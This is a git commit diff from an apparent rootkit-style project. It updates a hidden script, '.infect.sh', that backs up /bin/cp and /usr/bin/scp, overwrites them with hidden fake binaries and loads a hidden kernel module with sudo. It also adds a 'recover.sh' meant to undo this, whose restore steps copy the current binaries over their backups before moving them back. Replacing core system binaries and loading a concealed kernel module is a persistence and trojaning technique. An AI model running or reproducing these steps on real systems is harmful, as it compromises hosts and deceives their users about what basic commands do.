e77bcca6daa95b64d59d17bec4fc729a0795e8b0
lagoon0o0 <lagoonzxy@gmail.com>
2016-12-18 18:27:53 +0800

    .infect.sh updated recover.sh added

--- src/.infect.sh
+++ src/.infect.sh
@@ -1,5 +1,5 @@
 cp /bin/cp /var/tmp/.cp
 cp /usr/bin/scp /var/tmp/.scp
-mv -f /.fake-cp /bin/scp
-mv -f /.fake-scp /usr/bin/scp
+mv -f /.fake_cp /bin/cp
+mv -f /.fake_scp /usr/bin/scp
 sudo insmod /var/tmp/.hello.ko
---
+++ src/recover.sh
@@ -0,0 +1,5 @@
+cp /bin/cp /var/tmp/.cp
+cp /usr/bin/scp /var/tmp/.scp
+mv -f /var/tmp/.cp /bin/cp
+mv -f /var/tmp/.scp /usr/bin/scp
+sudo rmmod hello
